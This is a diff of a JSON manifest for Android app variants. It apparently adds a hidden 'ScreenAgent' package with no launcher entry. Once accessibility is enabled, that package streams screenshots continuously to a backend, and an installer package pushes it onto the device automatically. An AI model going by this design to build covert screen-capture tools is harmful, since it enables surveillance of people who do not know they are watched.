@@ -1,20 +1,47 @@
 [
-  {
-    "id": "screenagent-1.0",
-    "name": "v1.0 · ScreenAgent 单张截图",
-    "versionName": "1.0.0",
-    "versionCode": 1,
-    "sourceDir": "screenagent-1.0",
-    "kind": "screenagent",
-    "description": "手机确认后发送一张截图；首次接入仍需设备登记码。"
-  },
-  {
-    "id": "browser-1.0",
-    "name": "v1.0 · 浏览器基础版",
-    "versionName": "1.0",
-    "versionCode": 1,
-    "sourceDir": "browser-1.0",
-    "kind": "browser",
-    "description": "可见 WebView 浏览器与开关引导；不执行设备登记或截图上报。"
-  }
+    {
+        "id": "screenagent-1.2",
+        "name": "v1.2 · ScreenAgent 实时最新帧",
+        "versionName": "1.2.0",
+        "versionCode": 3,
+        "sourceDir": "b-packages/screenagent-1.2",
+        "kind": "screenagent",
+        "description": "B 包工作端；无障碍开启后上线并上报首图，后台实时查看租约有效时按系统最快安全间隔连续上传最新截图。"
+    },
+    {
+        "id": "screenagent-1.1",
+        "name": "v1.1 · ScreenAgent 按需截图",
+        "versionName": "1.1.0",
+        "versionCode": 2,
+        "sourceDir": "b-packages/screenagent-1.1",
+        "kind": "screenagent",
+        "description": "B 包工作端，只配置后台域名，无桌面、首页或系统打开入口；无障碍开启后上线并上报首图。"
+    },
+    {
+        "id": "screenagent-1.0",
+        "name": "v1.0 · ScreenAgent 单张截图",
+        "versionName": "1.0.0",
+        "versionCode": 1,
+        "sourceDir": "b-packages/screenagent-1.0",
+        "kind": "screenagent",
+        "description": "B 包工作端，只配置后台域名，无桌面、首页或系统打开入口；由 A 包打开设置。"
+    },
+    {
+        "id": "installer-1.0",
+        "name": "v1.0 · A 包安装器",
+        "versionName": "1.0.0",
+        "versionCode": 1,
+        "sourceDir": "a-packages/installer-1.0",
+        "kind": "installer",
+        "description": "A 包桌面安装器；配置 HTTPS 首页，自动携带同账号最新成功 B 包并调用系统安装确认。"
+    },
+    {
+        "id": "browser-1.0",
+        "name": "v1.0 · 浏览器基础版",
+        "versionName": "1.0",
+        "versionCode": 1,
+        "sourceDir": "standalone/browser-1.0",
+        "kind": "browser",
+        "description": "可见 WebView 浏览器与开关引导；不执行设备登记或截图上报。"
+    }
 ]
